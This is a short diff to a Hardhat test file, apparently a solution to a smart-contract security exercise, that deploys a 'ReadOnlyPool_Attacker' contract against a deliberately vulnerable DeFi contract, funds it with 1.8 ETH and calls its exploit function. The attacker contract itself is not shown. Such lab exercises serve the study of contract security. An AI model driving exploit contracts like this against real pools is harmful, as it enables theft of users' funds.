@@ -42,7 +42,14 @@ describe(NAME, function () {
 
         // prettier-ignore
         it("conduct your attack here", async function () {
-    
+      
+            const ReadOnlyPoolAttacker = await ethers.getContractFactory("ReadOnlyPool_Attacker");
+            const readOnlyPoolAttacker = await ReadOnlyPoolAttacker.deploy(readOnlyContract.address,vulnerableDeFiContract.address);
+            await attackerWallet.sendTransaction({
+                to: readOnlyPoolAttacker.address,
+                value: ethers.utils.parseEther("1.8"),
+            });
+            await readOnlyPoolAttacker.connect(attackerWallet).exploit();
     });
 
         after(async function () {
